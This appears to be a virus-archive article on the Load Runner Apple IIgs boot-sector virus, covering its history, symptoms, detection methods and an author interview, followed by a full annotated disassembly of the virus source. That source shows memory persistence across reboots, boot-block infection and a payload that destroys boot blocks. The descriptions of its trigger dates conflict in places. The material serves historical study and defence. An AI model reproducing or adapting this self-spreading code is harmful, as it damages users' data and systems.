Title: Load Runner
Date: 2026-08-20
Category: P16-IIGS
Tags: bootvir, prodos16, appleiigs
Preview: gallery/viruses/appleii/loadrunnerscr2.png
Summary: This article is about the Load Runner virus...

### Details
* *infects*: bootblock, bank $E1 in memory.
* *Authors*: SUPER HACKER & SHYRKAN
* *detonation conditions*: Load Runner would go off when you booted an infected disk on any day in October when the date was odd-numbered and the time in minutes was divisible by 8 (8, 16, 24, 32, 40, 48)
* *size*: 1024 bytes (0-1 blocks).

### Description

Lode Runner sits (or sat) on the boot blocks of a ProDOS disk. When the disk is booted, it installs itself into memory and infects every other disk that is booted. [It does this by hooking into the _BootInit code in the ROM, through the Memory Manager Tool Pointer Table. Hence it is a IIgs only virus.] The beauty of this, is that it's undetectable while it's going about it's business, and an open-apple-reset won't disturb it in the slightest. It takes about a quarter of a second to infect each disk, and it is done whilst the disk is actually booting. Before you know it, you could have infected disks all over the place. The only way to stop it, is by turning the computer off, or by doing a self-test (option-open-apple-reset).

The Lode Runner virus was written in France. Most probably by friends of the guys who wrote Nucleus and the various other French graphic demos (which I think are in the AUG library). It was originally distributed hidden inside a program called 'SpeedySmith'. SpeedySmith is a public domain FAST! disk copier that formats and writes on the fly. It seems a logical step to then hide a virus inside it. So what do you get when you give a copy of a super FAST! disk copier to a group of Apple enthusiasts? You get the Lode Runner virus spreading like wild fire!

So how do you know if you've been infected by a virus?

1 - It goes off! Not very helpful at all.
2 - You notice strange goings on with your disk drives. Like longer boot times, and various disk drives being accessed when completely unnecessary.
3 - You actually look for one, and find it!

The first is a sure fire method of finding a virus. Unfortunately, it's not very helpful apart from letting you know that you're about to spend your weekend reconstructing all your disks again. The third method is the preferred one, and I'll talk about that a bit later.

The second method is the most important. Most people ignore the early warning signs of a virus, even when they're completely obvious. You should take note of (roughly) how long it takes to boot a program. This means that if you are infected, you'll know because of the extra time it takes to boot. Also take note of which disk drives are accessed and for how long, as the only way a virus can spread, is by writing itself out to another disk. When a disk is read, depending on the size, ProDOS only has to read the beginning of the disk once or twice before the program is read in. When writing to a disk (such as a virus at work!), the drive arm will move to the beginning and middle/end of the disk quite a number of times whilst it updates the catalog.

A handy hint is to watch the GS/OS startup thermometer. When you add a new startup routine, or a desk accessory, the thermometer will usually not reach the end of the scale before loading finder. Subsequent boots however will be ok, as the correct timing for the startup has by then been calculated. If a virus writes itself out to GS/OS in some way, the thermometer will obviously change it's length the first time after the virus has infected the disk.

Actually looking for, and finding, a virus can be quite involved. If you know you've been infected, then you'll obviously know roughly where to look. If you don't know where, then you'll basically have to check your entire system. It seems logical that if a particular method of implementing a virus has been worked out, then there would either be a virus detector or an actual virus to take on the method. It therefore seems unlikely that virus detectors can predict how to detect and/or remove a particular virus until that virus actually exists. This is the main plus in the favour of the virus. The best we can really do, is detect known viruses and attempt to detect very obvious viruses that are yet to be written. i.e. Someone has to be the first to be infected by a virus. It might as well be you!

With the Lode Runner virus, there are several ways of detecting it. The first, is by getting a block editor (Bag of Tricks II, ProSel Block Warden, Copy II Plus) and checking block 0 of your disk. If the block starts with the bytes 01 A9 50, then you have been infected by the virus. As you can see by the third byte, Lode Runner will only infect disks in slot 5. This rules out 5.25" drives and hard drives. Another way of checking for the virus is as follows. Thanks to the Big Red Computer Club for this method: Get your original Space Quest I disk (that has probably ruled most people out), and write protect it. Now boot each disk you suspect as being infected, and boot Space Quest after each of them. If Space Quest bombs with an error #206 instead of getting to the joystick centering routine, then the last disk you booted was infected. The other simple way of detecting Lode Runner (the method I use), is by using ILTS. From ILTS v1.12 upward, you can set it up to automatically install your control panel settings on bootup. Considering ILTS lives at the same place as Lode Runner, simply installing ILTS wil destroy the virus completely. Now whenever the disk boots, ILTS displays a short message to say that it has installed your control panel settings correctly. If the disk ever gets infected again, the ILTS message won't appear anymore, and hey Presto! ILTS is available from AUGABBS in the filing cabinet.

### Description 2

is definitely native... it's got 65816 code in it, and it requires space in bank $E1 to hide in and a Memory Manager to subvert. It also watches the system clock. If the clock says the month is September, it sometimes (but not always) alters the screen border color. It was named after the famous Brøderbund game Lode Runner, and was thought to have originated in France through a IIGS fast disk copy program called Speedy Smith. This program used its own disk operating system, which made it hard to examine. Since the text screens displayed by the virus were in French, as were Speedy Smith‘s screens, it was suspect. Load Runner affected the boot block only on 3.5-inch disks; it did not affect 5.25-inch disks or hard drives. Depending on the speed of the Apple II GS (1.0, 2.4, 8.0 MHz) the speed at which the countdown from 09 to 00 occurs changes and at 8.0 MHz it really takes 4 seconds. But at 1.0 MHz it takes all 10 seconds... 

During detonation Changes everything to red and sets a timer for 10 seconds with sound on a red background:

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/loadrunnerscr1.png)

After which it colors the screen dark green and displays the following message:

![Screenshot of Load Runner final detonation]({static}/gallery/viruses/appleii/loadrunnerscr2.png)

And also the frame around the green square where the text is located quickly changes colors. 000F is the number of copies he managed to make while he was with you. After that Block $0 & $1 Destroyed.

The creator of the virus was interviewed and asked about Load Runner:
Q: Why write a virus?
A: The idea for Load Runner came to me one quiet evening, and the next day I met Super Hacker again in high school and told him that the boot sector could pick up a virus program. He then worked on the code, and I even believe that I still have the source code for Merlin somewhere. It should be clarified that it was non-destructive, since it was limited to changing the boot (other sectors were not loaded or affected). But it was the first thing that impressed us most, since I remember many of my floppies being infected during setup. But I would say, above all, that the technical challenge was our main motivation, and above all, Super Hacker found the trick. The idea was part of that boot sector that fascinated me, as well as RWTS, and today that quality is no longer there, since there are far fewer restrictions.
Q: Do you have the feeling that this served as an incentive for other hackers who then created other viruses (Dave, Starfighter I & II, ...)?
A: <No answer> We didn't make any other viruses after that.
Q: On the Load Runner virus screen, it says: distributed by Artistes Associés. What was the relationship between MCS and AA/LSD (Lyon Software Distribution) other than the fact that you were from Lyon?
A: None, it's a recovery, or I don't remember such an organization.
Q: Did you feel known? Were you talked about in the press? If so, what effect did it have on you?
A: No, at least not until the episode "Load Runner" which was, I think, our moment of notoriety.

As far as we can tell the virus is spread two ways: by being copied with a copy program and by booting an uninfected disk (using OA-CTRL-RESET) 
immediately after running an infected disk. NOTE: For a disk to be infected it must not be write-protected. 
The virus does NOT infect actual files so none of your files will look modified in either their file length or their modified date. 
The virus also does not search all drives, as did Festering Hate, so cannot be detected that way. 
Because it doesn't infect files it only infects one spot per disk and cannot destroy any sub-directories. 
Therefore your cannot get rid of the virus just by re-copying the files...
the virus is actually part of the Prodos kernel created when the disk is formatted.
If you have a copy of Space Quest I then you can use it to check all your disks. 
Boot any suspect disk and wait until the drive stops. 
Replace the disk with Space Quest and do the 3 or 4 fingered salute (OA-CTRL-RESET). 
NOTE: Keep Space Quest write protected so that it dosn't get screwed up. 
If Space Quest boots to the point where it asks you to press a joystick button then you can be pretty sure that the previous disk is OK. 
If Space Quest trashes with an error message (#206) then the previous disk is likely infected.
If you DO get an infected disk then you MUST either power down your IIgs or run the self-test before continuing with your testing to clear the RAM as the virus seems to install itself there.
A better check (and much faster) is to boot Copy II+ and run the 3.5" Sector Editor. Do a read of Block 0000 (Track 00, sector 00, side 01). 
If the first 3 bytes are 01 A9 50 then the disk is infected. Those 3 bytes aren't the only bytes that are different but they are all that is necessary to identify the virus.
If you recall, last year during the Festering Hate panic it was noted that one of the best ways to have an Apple II virus was in BLOCK (0) on any Prodos disk. 
At that point, anticipating another virus, Guy T. Rice wrote a small virus detector/fixer. 
If you put this program into the SYSTEM/SYSTEM.SETUP folder on IIgs disks then it would automatically detect and correct modifications to Block (0). 
Now for LODE RUNNER this will also work.. that is, it WILL detect LODE RUNNER and it will try to correct Block (0). BUT, it appears that due to the method of spreading of LR Guy's program cannot correct it. 
Every time you boot the disk it'll give you the virus detect error. 
I think the reason for this is that LR installs itself in RAM upon bootup in preparation for infecting a new disk.. 
and the only way you can be sure that its gone is to either power down or run the self-test.. 
and since Guy Rice's program does an auto-reboot and corrects the block (0) all in one step then the RAM never really clears and the virus re-infects the disk. 
And since you cannot write-protect the disk it becomes a vicious circle. 
I am going to try to get these observations to Guy Rice in the hopes that he can modify his program. 
NOTE: Three other problems with using Guy's program: its no good for 5.25" disks, it only works with a IIgs and it only works with disks that are bootable. 
LODE RUNNER can infect ANY Prodos disk because it resides in one of the blocks created when a disk is formatted.
There is a 5th way.. the friends in Eugene, Ore have written a Binary program to detect and disarm the virus and I will try to include it in this file when I upload it. 
The reason theirs is successful is that the detector is not part of the disk being checked and thus the "circle" is broken.
LR will destroy Space Quest 1 and Police Quest for the IIgs if they are booted AT ANY TIME after an infected disk.. 
and if they are not write-protected. It is not necessary for LR to "go off" for these programs to be rendered useless. 
I have only found these two that behave in this fashion but I am sure there are more.. 
likely most of the Sierra programs for the IIgs.
To get Lode Runner to "go off" you must set your Control Panel's clock to the following: 
the MONTH must be October, the DAY must be an odd numbered day and the minute must be a number divisable by 8. 
Next you must boot an infected disk then boot (using OA-CTRL-RESET) any other disk. 
This second disk must NOT be write-protected or the virus won't activate.

If you're curios to see what the "interesting message" looks like without risking your disks to see it, run Loadrunner.demo. I extracted this part of the virus and placed it into a seperate file. Don't worry, it won't hurt anything - it's just interesting to watch. When you're through watching it, I just press control-reset and the program will quite to whatever it was launched from.

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/lrdemoscreen1.png)

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/lrdemoscreen2.png)

You cannot remove the virus from the computer by doing a reboot - you need do a cold start by turning the computer off and on again or running the self-test.

if the loadrunner virus is in your system and you boot up on a even numbered day while the minute is divisible by eight, loadrunner will change your border color. It used to be believed that this was a "bug" of the virus but it's just a little clue that something is wrong.

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/runerdanger.png)

One more thing I've never heard before - you can ask loadrunner if it's in your computer by holding down the option key when you restart your computer. If it's there, it will display a number on the screen - the number of times! It has infected others disks!

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/runercount1.png)

If you're quick enough or reboot at the right moment, you'll see the counter right on the main loading screen! In any case, the counter will always be +1 to the actual number of infections.

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/runercount2.png)

If you play with the counter and make it "FFFF" it will become 0000 when you try to "ask" Load Runner how many disks were infected.

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/runercount3.png)

and if you boot at a time when the minutes are divisible by 8 and "ask" Load Runner about its presence, it will change the color of the screen frame and display the number of infected disks.

![Screenshot of Load Runner detonation]({static}/gallery/viruses/appleii/runercount4.png)

### Load Runner code. Disassembled by Derek Young.

	**************************************************
	*                                                *
	*           -- The LoadRunner virus --           *
	*       -- Disassembled by Derek Young --        *
	*                                                *
	**************************************************

	HighBuffer = $61 ;high byte of IO buffer

	UnitNum = $43
	Command = $42 ;these are for the prodos device driver
	Buffer = $44
	BlockNum = $46

	Tool_Entry = $E10000
	ReadTimeHex = $0D03
	NewHandle = $0902
	PRNTAX = $F941
	HOME = $FC58
	WAIT = $FCA8
	SPKR = $C030
	OptionKey = $C062

	Vector = $E11688

	*-------------------------------------------------
	 xc
	 xc
	 org $0800
	 mx %11

	H0800 hex 01 ;the one byte signature
	 lda #$50
	 sta UnitNum

	 lda $C5FF
	 sta Entry+1 ;set up the smartport entry vector

	 stz $4A
	 stz $4C
	 stz $4E

	 stz BlockNum+1
	 stz Buffer
	 ldy #$01
	 sty Command ;Read command
	 sty BlockNum ;block 1
	 ldy #$0A ;read it into $A00
	 sty HighBuffer
	 jsr Block
	 bcs RegularBoot ;do a prodos load

	 ldal $E1BC00 ;has LoadRunner been installed in this computer?
	 cmp #$01
	 bne :Install
	 ldal $E1BC02
	 cmp #$50
	 bne :Install
	 ldal $E1168B
	 cmp #$FF
	 bne CheckTime
	:Install brl InstallVirus

	CheckTime clc
	 xce
	 rep $30
	 pha
	 pha
	 pha
	 pha
	 ldx #ReadTimeHex
	 jsl Tool_Entry
	 plx  ;minute and second
	 pla  ;year and hour
	 ply  ;month and day
	 pla  ;week day
	 tya
	 and #$0F00 ;single out the month
	 cmp #$0900 ;is it after october?
	 blt :NotYet

	 sep $30
	 lda #$02
	 sta Command ;Write command
	 stz BlockNum
	 lda #$20 ;an unused part right now
	 sta HighBuffer
	 jsr Block ;erase block 0
	 bcs :NotYet

	 inc BlockNum
	 jsr Block ;erase block 1
	 bcs :NotYet

	 lda #-1
	 sta InfectFlag
	 stal $E1BE51 ;put a signature byte in RAM
	 stz H0800 ;indicate it has infected...

	:NotYet sec
	 xce
	 lda H0800 ;was there an error?
	 bne RegularBoot ;yes, do a regular bootup
	 jmp RunVirus ;nope...

	*-------------------------------------------------
	* Perform a standard Prodos boot.

	RegularBoot ldy #$01 ;do a real bootup
	 sty Command ;read command
	 iny
	 sty BlockNum
	 lda #$0C
	 sta HighBuffer
	 sta $4B
	]loop jsr Block ;read block 2 into $C00
	 bcs ProError ;print the prodos error message

	 inc HighBuffer
	 inc HighBuffer ;next memory address
	 inc BlockNum ;next block
	 lda BlockNum
	 cmp #$06 ;read up to block 6
	 blt ]loop
	 lda #$04
	 bne :1
	:Next lda $4A
	:1 clc
	 adc #$27 ;skip to the first (next) name in the directory
	 tay
	 bcc :fine ;did we cross pages?
	 inc $4B
	 lda $4B ;is the new page number even?
	 lsr
	 bcs :fine ;no, just the high page
	 cmp #$0A ;did we read to the end of the directory?
	 beq ProError ;yes - prodos not found.
	 ldy #$04 ;no.  Skip over the link bytes in the block
	:fine sty $4A

	 ldy #7-1
	]loop lda ($4A),Y ;is this the "PRODOS" entry?
	 cmp Prodos,Y
	 bne :Next ;try the next entry
	 dey
	 bpl ]loop

	 ldy #$11
	 lda ($4A),Y ;get the file's key block
	 sta BlockNum
	 iny
	 lda ($4A),Y
	 sta BlockNum+1

	 stz $4A
	 ldy #$1E
	 sty $4B ;read the key block into $1E00
	 sty HighBuffer
	 iny
	 sty $4D
	]loop jsr Block ;read a block of the file
	 bcs ProError
	 inc HighBuffer ;next spot in memory
	 inc HighBuffer
	 ldy $4E
	 inc $4E
	 lda ($4A),Y ;find the next block
	 sta BlockNum
	 lda ($4C),Y
	 sta BlockNum+1
	 ora ($4A),Y ;all done if the block number is 0
	 bne ]loop
	 jmp $2000 ;jump to the PRODOS file

	ProError jsr HOME ;print the prodos error message
	 ldy #$1C
	]loop lda ErrMessage,Y
	 sta $05AE,Y ;screen memory
	 dey
	 bpl ]loop
	:Hang bmi :Hang

	ErrMessage asc "*** UNABLE TO LOAD PRODOS ***"

	Block   ;read/write a block
	 lda HighBuffer
	 sta Buffer+1
	Entry jmp $C50A ;load a block

	Prodos db $26 ;storage type/name length
	 asc 'PRODOS'

	*-------------------------------------------------
	* This code installs the virus code into bank
	* $E1 under the softswitches ($BC00-$BFFF).
	* It allocates this memory with an ID of
	* $0001 - the Memory Manager's ID.  This way it
	* isn't cleared even after a reboot.

	InstallVirus mx %00

	 clc
	 xce
	 rep $30

	 lda #0
	 pha
	 pha  ;result space

	 pha
	 pea $400 ;length of block
	 pea $0001 ;Memory ID of $0001!
	   ;this tells the memory manager to keep this
	   ;block in memory even after rebooting.
	 pea $C017 ;attributes

	 pea $E1
	 pea $BC00 ;location: $E1BC00
	   ;this is just under the softswitches in $E1
	 ldx #NewHandle
	 jsl Tool_Entry
	 ply
	 ply  ;ignore the handle
	 bcs :MemoryError

	 lda #$400-1 ;copy both blocks 0 and 1
	 ldx #$800 ;source - start of code
	 ldy #$BC00 ;destination - memory block
	 mvn $000000,$E10000 ;copy the code

	   ;Now patch the reboot vector to point to the code
	 lda Vector+2 ;all in bank $E1 now (MVN changes data bank...)
	 sta $BE4F ;($A4F)
	 lda #$E1BD
	 sta Vector+2
	 lda Vector ;point to $E1BD8A ($95A)
	 sta $BE4D
	 lda #$8A5C
	 sta Vector ;patch into vector $E1/1688

	:MemoryError phk
	 plb
	 sec
	 xce
	 brl CheckTime ;see if it's time to infect

	 cpx #$02
	 ora ($D0,X)
	 php
	 bra H099A

	 ldal $000805
	 beq H099A
	 brl H0A4D

	* Code normally pointed to by vector $E1/1688
	* when GS/OS is active.

	 do 0 ;don't assemble this part

	 cpx #$0C02
	 beq :1
	 cpx #$0D02
	 beq :1
	 jml $FF0199
	:1 txa
	 xba
	 sep $30
	 and #$FF
	 tax
	 lda #$E1
	 pha
	 lda #$04
	 jml $FF01A7

	 fin

	*------------------------------------------------*
	*                                                *
	* LoadRunner's "hidden" code.  This code         *
	* is tucked away in bank $E1 under the soft-     *
	* switches ($800-$A00).  LoadRunner allocates    *
	* this memory with a memory ID of $0001 so that  *
	* the code will remain in memory even after a    *
	* reboot.  LoadRunner patches a secret GS vector *
	* that allows it to be run every time the        *
	* computer reboots.                              *
	*                                                *
	*------------------------------------------------*

	 mx %00
	H099A php
	 phx
	 phb
	 phd
	 lda #$400-1
	 ldx #$BC00 ;source
	 ldy #$800 ;destination
	 mvn $E10000,$000000
	 jml $0009AE ;bounce into bank 0

	 lda #0 ;The above JML jumps to here (now in bank $00)
	 tcd
	 inc InfectCount
	 pha
	 pha  ;result space
	 pha
	 pha
	 ldx #ReadTimeHex
	 jsl Tool_Entry
	 plx  ;minute and second
	 pla  ;year and hour
	 ply  ;month and day
	 pla  ;week day
	 tya
	 and #$0F00 ;isolate the month
	 cmp #$0800 ;is it October?
	 blt :skip ;not yet...
	 beq :October
	 lda InfectFlag ;did it just infect a disk?
	 beq :October ;no, keep checking
	 brl RunVirus ;yes, run it!

	:October tya
	 and #1 ;is it an even day?
	 bne :skip
	 txa
	 and #$0700 ;is the minute divisible by 8?
	 bne :skip
	 sec
	 xce  ;emulation

	 lda $C034 ;get the border color
	 tax
	 and #$F0
	 sta Command
	 txa
	 inc
	 and #$0F
	 ora Command
	 sta $C034 ;increment the border color

	:skip sec
	 xce
	 lda OptionKey ;is the option key pressed?
	 bpl :Infect ;no...

	 ldx InfectCount ;if so, print the infection count
	 lda InfectCount+1
	 jsr PRNTAX

	:Infect lda #$01
	 sta Command ;read command
	 lda #$50
	 sta UnitNum
	 stz Buffer
	 lda #$10
	 sta HighBuffer ;$1000
	 stz BlockNum
	 stz BlockNum+1 ;block 0
	 jsr Block ;read in block o to $1000
	 bcs :Exit

	 lda $1001 ;read the second byte of the block loaded
	 cmp #$38
	 bne :Exit

	 lda #$08 ;$800
	 sta HighBuffer
	 inc Command ;write command
	 jsr Block
	 bcs :Exit ;write the virus to block 0

	 inc HighBuffer
	 inc HighBuffer
	 inc BlockNum
	 jsr Block ;write the second half of it
	 bcs :Exit

	 clc
	 xce
	 rep $30
	 lda InfectCount ;store the infection count in the virus's
	 stal $E1BF19 ;"private" memory

	:Exit clc
	 xce  ;always exit in native mode
	 rep $30
	 pld
	 plb  ;reset everything
	 plx
	 plp
	H0A4D jml $FF0199 ;this instruction patched

	InfectFlag dw 0

	*-------------------------------------------------
	*
	*         Virus time!
	*         This is the code that is executed when
	*         the virus is triggered.

	RunVirus sec
	 xce
	 inc $3F4 ;force a reboot
	 sei  ;disable the control panel and all other interrupts
	 lda #$80
	 sta $C036 ;fast system speed
	 lda #$0F
	 sta $C03C ;Hi volume
	 lda #$F1
	 sta $C022 ;White text, deep red background
	 lda #$41
	 sta $C034 ;deep red border
	 jsr HOME ;clear the screen
	 sta $C00C ;go to 40 column mode

	 ldy #$1E ;string length
	 stz $61 ;start the key at zero
	]loop1 lda Message1,Y ;get the data...
	 jsr Decrypt ;...decrypt it...
	 sta $52C,Y ;...and put it on the screen
	 dey
	 bpl ]loop1

	 lda #'0' ;set up a countdown
	 sta $63A
	 lda #'9'+1
	 sta $63B
	 lda #$50
	 sta $42

	 ldy #10
	]loop dec $63B ;tick down a second
	 phy
	 lda #$28
	 sta $43
	 jsr Sound
	 lda #$30
	 sta $43
	 jsr Sound
	 ply
	 dey
	 bne ]loop
	 jsr HOME ;screen clear
	 sta $C00C ;40 columns

	 lda #$F4
	 sta $C022 ;set the colors

	 ldy #$1E
	]loop2 lda Message2,Y
	 jsr Decrypt
	 sta $704,Y
	 dey
	 bpl ]loop2

	 ldy #$25
	]loop3 lda Message3,Y
	 jsr Decrypt
	 sta $729,Y
	 dey
	 bpl ]loop3

	 ldy #$1D
	]loop4 lda Message4,Y
	 jsr Decrypt
	 sta $6D5,Y
	 dey
	 bpl ]loop4

	 ldy #$27
	]loop5 lda Message5,Y
	 jsr Decrypt
	 sta $7D0,Y
	 dey
	 bpl ]loop5

	 ldy #$1F
	]loop6 lda Message6,Y
	 jsr Decrypt
	 sta $406,Y
	 dey
	 bpl ]loop6

	 ldx InfectCount ;print the infection number?
	 lda InfectCount+1
	 jsr PRNTAX

	]cycle lda #$08
	 jsr WAIT
	 lda $C034 ;cycle the border color
	 inc
	 and #$0F
	 sta $C034
	 bra ]cycle ;hang infinitely

	Decrypt inc  ;decrypt a byte of the message
	 eor $61
	 sta $61 ;update the "key"
	 rts

	*-------------------------------------------------
	* LoadRunner's data

	InfectCount da 15 ;the infection count

	Message6 HEX 2B1E180B155C0DFF632C190605477A32
	 HEX 051C19061015526031FF1B0B090B1516

	Message5 HEX 1054FF6C0B1106101600726210120107
	 HEX 01060866721516031E090564FF100700
	 HEX FF17FF6B3415001D

	Message4 HEX 101251FFFF720504141671670801070D
	 HEX 1671FF0505FF721A100A18090E1D

	Message3 HEX 211607030B1651551E1A0605526D0000
	 HEX 626800150605061516100F0671520506
	 HEX 5168FF0D136D

	Message2 HEX FFFF1CFF6B6B6E6E60606363FFFF7171
	 HEX 74746D6D6D6D64647171FF1CFFFF15

	Message1 HEX FFFF0AFF7209090610076CFF65060704
	 HEX 18061664FF48064D1919FF0AFFFFAA

	Sound ldy $42
	:c ldx #0
	:b txa
	 clc
	:a sbc #1
	 bne :a
	 sta SPKR
	 inx
	 cpx $43
	 bne :b
	 dey
	 bne :c
	 rts

	 ds \

	 sav My.Runner

## Info & Links

VIRUSES ON THE APPLE //
By Richard Bennett
Copyright (c) 1990 Apple Users' Group, Sydney
Republished from Applecations, a publication of the Apple Users' Group, Sydney, Australia.

http://members.iinet.net.au/~kalandi/apple/AUG/1990/01%20JAN.FEB/VIRUSES.html

https://discmaster.textfiles.com/view/13185/0_GoldenOrchard1.2.iso/Applications/AntiVirus/LodeRunner%20Virus%20Info/Virus

https://discmaster.textfiles.com/view/32392/GoldenGrail1.0.zip/GO-ProDOS.2mg/GO.ProDOS/AppleWorks.N.Z/virus.disk/LR.INFO.AWP

https://www.apple2history.org/history/ah23/

La Pomme Illustree 0

II Alive, Mar-Apr 1993, _Infected!_, Doug Cuff, pp. 28-33
II Alive, May-Jun 1993, _Infected!, part 2_, Doug Cuff, pp. 40-42

THIS CONTENT COPYRIGHT © 2007, APPLE MACINTOSH USERS' GROUP, SYDNEY
Permission has been obtained to make this material available on the Internet.

Permission is hereby granted for non-profit user groups to republish this content.
PLEASE CREDIT THE AUTHOR AND THE SOURCE: Applecations, publication of the Apple Users' Group, Sydney, Australia

THIS PAGE COPYRIGHT © 2007, ANDREW ROUGHAN
